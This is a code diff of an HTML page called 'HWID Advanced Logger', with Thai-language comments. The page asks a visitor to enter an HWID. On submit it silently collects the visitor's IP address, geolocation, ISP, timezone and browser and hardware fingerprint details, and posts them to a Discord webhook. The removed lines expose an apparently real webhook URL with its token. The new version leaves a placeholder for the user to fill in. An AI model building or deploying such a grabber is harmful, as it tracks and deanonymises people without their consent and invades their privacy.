@@ -1,3 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>HWID Advanced Logger</title>
+  <style>
+    body {
+      font-family: Arial;
+      background: #0f172a;
+      color: white;
+      text-align: center;
+      padding: 50px;
+    }
+    input {
+      padding: 12px;
+      width: 350px;
+      border-radius: 10px;
+      border: none;
+    }
+    button {
+      padding: 12px 20px;
+      margin-left: 10px;
+      border-radius: 10px;
+      border: none;
+      cursor: pointer;
+      background: #22c55e;
+      color: white;
+      font-weight: bold;
+    }
+    .card {
+      margin-top: 20px;
+      background: #1e293b;
+      padding: 20px;
+      border-radius: 15px;
+      text-align: left;
+      display: inline-block;
+    }
+  </style>
+</head>
+<body>
+
+<h1>🧠 Advanced HWID Logger</h1>
+
+<input id="hwid" placeholder="Enter HWID..." />
+<button onclick="run()">Submit</button>
+
+<div id="result"></div>
+
 <script>
 async function getIP() {
   try {
@@ -18,36 +65,13 @@ async function getGeo(ip) {
   }
 }
 
-async function sendToDiscord(data) {
-  const webhook = "https://discord.com/api/webhooks/1499459321510101186/k9uFDPnvpJ5peuvFJ6sWXbtyweO2NvbOfCGzdEaBbnGToEmlILLOp_7fzFW6FHdS-Eqv";
-
-  await fetch(webhook, {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-      embeds: [{
-        title: "🧠 USER DATA",
-        color: 0x00ffcc,
-        fields: [
-          { name: "HWID (input)", value: data.hwid || "none" },
-          { name: "IP", value: data.ip },
-          { name: "Country", value: data.country },
-          { name: "City", value: data.city },
-          { name: "Browser", value: data.browser },
-          { name: "OS", value: data.os },
-          { name: "Screen", value: data.screen },
-          { name: "UserAgent", value: data.ua }
-        ],
-        timestamp: new Date()
-      }]
-    })
-  });
-}
-
-async function check() {
+async function run() {
   const hwid = document.getElementById("hwid").value.trim();
+
+  if (!hwid) {
+    document.getElementById("result").innerText = "❌ ใส่ HWID ก่อน";
+    return;
+  }
 
   const ip = await getIP();
   const geo = await getGeo(ip);
@@ -57,14 +81,60 @@ async function check() {
     ip: ip,
     country: geo.country_name || "unknown",
     city: geo.city || "unknown",
+    org: geo.org || "unknown",
+    timezone: geo.timezone || "unknown",
     browser: navigator.userAgent,
     os: navigator.platform,
+    language: navigator.language,
     screen: screen.width + "x" + screen.height,
-    ua: navigator.userAgent
+    cores: navigator.hardwareConcurrency || "unknown",
+    memory: navigator.deviceMemory || "unknown",
+    time: new Date().toLocaleString()
   };
 
-  document.getElementById("result").innerText = "ส่งข้อมูลแล้ว ✅";
+  // 🔥 แสดงหน้าเว็บ
+  document.getElementById("result").innerHTML = `
+    <div class="card">
+      <p><b>HWID:</b> ${data.hwid}</p>
+      <p><b>IP:</b> ${data.ip}</p>
+      <p><b>Country:</b> ${data.country}</p>
+      <p><b>City:</b> ${data.city}</p>
+      <p><b>ISP:</b> ${data.org}</p>
+      <p><b>Timezone:</b> ${data.timezone}</p>
+      <hr>
+      <p><b>OS:</b> ${data.os}</p>
+      <p><b>Browser:</b> ${data.browser}</p>
+      <p><b>Language:</b> ${data.language}</p>
+      <p><b>Screen:</b> ${data.screen}</p>
+      <p><b>CPU Cores:</b> ${data.cores}</p>
+      <p><b>RAM (approx):</b> ${data.memory} GB</p>
+      <hr>
+      <p><b>Time:</b> ${data.time}</p>
+    </div>
+  `;
 
-  await sendToDiscord(data);
+  // 🔥 ส่งเข้า Discord
+  const webhook = "ใส่ webhook ของคุณ";
+
+  await fetch(webhook, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      embeds: [{
+        title: "🧠 USER FULL DATA",
+        color: 0x00ffcc,
+        fields: Object.entries(data).map(([k,v]) => ({
+          name: k.toUpperCase(),
+          value: String(v)
+        })),
+        timestamp: new Date()
+      }]
+    })
+  });
 }
 </script>
+
+</body>
+</html>
